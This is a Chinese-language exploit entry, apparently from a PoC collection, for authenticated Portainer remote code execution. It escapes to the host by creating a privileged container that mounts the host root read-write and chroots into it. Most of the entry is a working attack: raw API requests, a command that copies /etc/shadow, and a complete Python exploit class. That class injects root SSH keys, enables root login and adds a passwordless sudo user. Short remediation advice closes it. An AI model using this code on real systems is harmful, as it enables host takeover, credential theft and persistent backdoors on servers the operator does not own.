---
id: PORTAINER-DOCKER-API-RCE
title: "Portainer - 认证后Docker API特权容器逃逸RCE"
product: portainer
vendor: Portainer
version_affected: "all versions"
severity: CRITICAL
tags: [rce, 需认证, docker_api, privileged_container, container_escape]
fingerprint: ["Portainer"]
---

## 漏洞描述

拥有Portainer有效凭据后，可通过Portainer的Docker API代理功能创建特权容器，将宿主机根文件系统以读写模式挂载到容器内（`/:/host:rw`），再通过 `chroot /host` 切换到宿主机文件系统，从而获取宿主机的root权限执行任意命令。这是Portainer最核心的后利用手法，适用于所有版本。

## 影响版本

- Portainer 全版本（需有效认证凭据）

## 前置条件

1. 有效的Portainer认证凭据（JWT Token）
2. Portainer管理的Docker端点可用
3. Docker端点上存在可用镜像（如 `ubuntu:20.04`、`alpine` 等）

## Portainer API端点速查

| 端点 | 方法 | 用途 |
|------|------|------|
| `/api/auth` | POST | 登录获取JWT Token |
| `/api/endpoints` | GET | 获取Docker端点列表 |
| `/api/endpoints/{id}/docker/images/json` | GET | 列出可用镜像 |
| `/api/endpoints/{id}/docker/containers/create` | POST | 创建容器 |
| `/api/endpoints/{id}/docker/containers/{id}/start` | POST | 启动容器 |
| `/api/endpoints/{id}/docker/containers/{id}/wait` | POST | 等待容器执行完成 |
| `/api/endpoints/{id}/docker/containers/{id}` | DELETE | 删除容器 |
| `/api/endpoints/{id}/docker/images/load` | POST | 上传镜像 |

## 利用步骤

### Step 1: 登录获取Token

```http
POST /api/auth HTTP/1.1
Host: <target>:9000
Content-Type: application/json

{"Username": "admin", "Password": "<password>"}
```

返回: `{"jwt":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}`

### Step 2: 获取Docker端点

```http
GET /api/endpoints HTTP/1.1
Host: <target>:9000
Authorization: Bearer <jwt_token>
```

返回中 `Id` 字段为端点ID（通常为1）。

### Step 3: 创建特权容器（挂载宿主机文件系统）

```http
POST /api/endpoints/1/docker/containers/create HTTP/1.1
Host: <target>:9000
Authorization: Bearer <jwt_token>
Content-Type: application/json

{
    "Hostname": "exploit",
    "Image": "ubuntu:20.04",
    "Cmd": ["/bin/sh", "-c", "chroot /host /bin/bash -c 'id > /tmp/pwned && cat /etc/shadow > /tmp/shadow'"],
    "HostConfig": {
        "Binds": ["/:/host:rw"],
        "Privileged": true
    }
}
```

核心配置说明：
- `"Privileged": true` -- 特权模式，无任何隔离
- `"Binds": ["/:/host:rw"]` -- 宿主机根目录挂载为读写
- `chroot /host` -- 切换到宿主机文件系统，命令直接作用于宿主机

### Step 4: 启动容器

```http
POST /api/endpoints/1/docker/containers/<container_id>/start HTTP/1.1
Host: <target>:9000
Authorization: Bearer <jwt_token>
```

### Step 5: 等待执行完成并清理

```http
POST /api/endpoints/1/docker/containers/<container_id>/wait HTTP/1.1
Host: <target>:9000
Authorization: Bearer <jwt_token>
```

## Payload

### 完整Python利用类

```python
import requests
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class PortainerExploit:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.token = None
        self.headers = {}

    def login(self, username, password):
        """登录获取JWT Token"""
        r = requests.post(f"{self.target}/api/auth",
                         json={"Username": username, "Password": password},
                         verify=False, timeout=10)
        if r.status_code == 200 and "jwt" in r.text:
            self.token = r.json()["jwt"]
            self.headers = {"Authorization": f"Bearer {self.token}"}
            print(f"[+] 登录成功, Token: {self.token[:40]}...")
            return True
        print(f"[-] 登录失败: {r.status_code}")
        return False

    def get_endpoints(self):
        """获取Docker端点列表"""
        r = requests.get(f"{self.target}/api/endpoints",
                        headers=self.headers, verify=False, timeout=10)
        if r.status_code == 200:
            endpoints = r.json()
            for ep in endpoints:
                print(f"[*] 端点 ID:{ep['Id']} 名称:{ep['Name']} 类型:{ep.get('Type','unknown')}")
            return endpoints
        print(f"[-] 获取端点失败")
        return []

    def get_images(self, endpoint_id):
        """获取可用镜像"""
        r = requests.get(f"{self.target}/api/endpoints/{endpoint_id}/docker/images/json",
                        headers=self.headers, verify=False, timeout=10)
        if r.status_code == 200:
            images = r.json()
            for img in images:
                if img.get("RepoTags"):
                    print(f"[*] 镜像: {', '.join(img['RepoTags'])}")
            return images
        return []

    def execute_command(self, endpoint_id, command, image="ubuntu:20.04"):
        """
        通过特权容器在宿主机执行命令
        挂载宿主机根目录到 /host，使用chroot执行命令
        """
        container_config = {
            "Hostname": "tmp_exec",
            "Image": image,
            "Cmd": ["/bin/sh", "-c", f"chroot /host /bin/bash -c '{command}'"],
            "HostConfig": {
                "Binds": ["/:/host:rw"],
                "Privileged": True
            }
        }

        # 创建容器
        r = requests.post(f"{self.target}/api/endpoints/{endpoint_id}/docker/containers/create",
                         headers=self.headers, json=container_config, verify=False, timeout=15)
        if r.status_code != 200 and r.status_code != 201:
            print(f"[-] 创建容器失败: {r.status_code} {r.text[:200]}")
            return None
        container_id = r.json()["Id"]
        print(f"[+] 容器创建成功: {container_id[:12]}")

        # 启动容器
        r = requests.post(f"{self.target}/api/endpoints/{endpoint_id}/docker/containers/{container_id}/start",
                         headers=self.headers, verify=False, timeout=15)
        if r.status_code not in [200, 204]:
            print(f"[-] 启动容器失败: {r.status_code}")
            return None
        print(f"[+] 容器已启动")

        # 等待执行完成
        r = requests.post(f"{self.target}/api/endpoints/{endpoint_id}/docker/containers/{container_id}/wait",
                         headers=self.headers, verify=False, timeout=30)
        status_code = r.json().get("StatusCode", -1) if r.status_code == 200 else -1
        print(f"[+] 容器执行完成, 退出码: {status_code}")

        # 删除容器
        requests.delete(f"{self.target}/api/endpoints/{endpoint_id}/docker/containers/{container_id}",
                       headers=self.headers, verify=False, timeout=10)
        print(f"[+] 容器已清理")

        return status_code

    def add_ssh_key(self, endpoint_id, public_key, image="ubuntu:20.04"):
        """注入SSH公钥到宿主机root账户"""
        cmd = (
            f"mkdir -p /root/.ssh && "
            f"echo '{public_key}' >> /root/.ssh/authorized_keys && "
            f"chmod 600 /root/.ssh/authorized_keys && "
            f"echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && "
            f"echo 'PubkeyAuthentication yes' >> /etc/ssh/sshd_config"
        )
        return self.execute_command(endpoint_id, cmd, image)

    def add_user(self, endpoint_id, username, password_hash, image="ubuntu:20.04"):
        """添加用户到宿主机"""
        cmd = (
            f"useradd -m -s /bin/bash {username} && "
            f"echo '{username}:{password_hash}' | chpasswd -e && "
            f"echo '{username} ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers"
        )
        return self.execute_command(endpoint_id, cmd, image)

# 使用示例:
# p = PortainerExploit("http://target:9000")
# p.login("admin", "password")
# endpoints = p.get_endpoints()
# p.execute_command(1, "id")
# p.execute_command(1, "cat /etc/shadow")
# p.add_ssh_key(1, "ssh-rsa AAAA... user@attacker")
```

## 验证方法

```bash
# 确认Portainer实例
curl -sk http://target:9000/api/status

# 登录获取Token
TOKEN=$(curl -sk -X POST http://target:9000/api/auth \
  -H "Content-Type: application/json" \
  -d '{"Username":"admin","Password":"password"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['jwt'])")

# 查看Docker端点
curl -sk http://target:9000/api/endpoints \
  -H "Authorization: Bearer $TOKEN"

# 查看可用镜像
curl -sk http://target:9000/api/endpoints/1/docker/images/json \
  -H "Authorization: Bearer $TOKEN"
```

## 修复建议

1. 使用强密码保护Portainer管理员账户
2. 启用RBAC，限制用户权限（仅授予必要的Docker端点访问权限）
3. 禁止非管理员用户创建特权容器
4. 网络层限制Portainer仅内网可访问
5. 启用审计日志，监控容器创建/启动操作
6. 考虑使用Docker AppArmor/Seccomp Profile限制容器能力
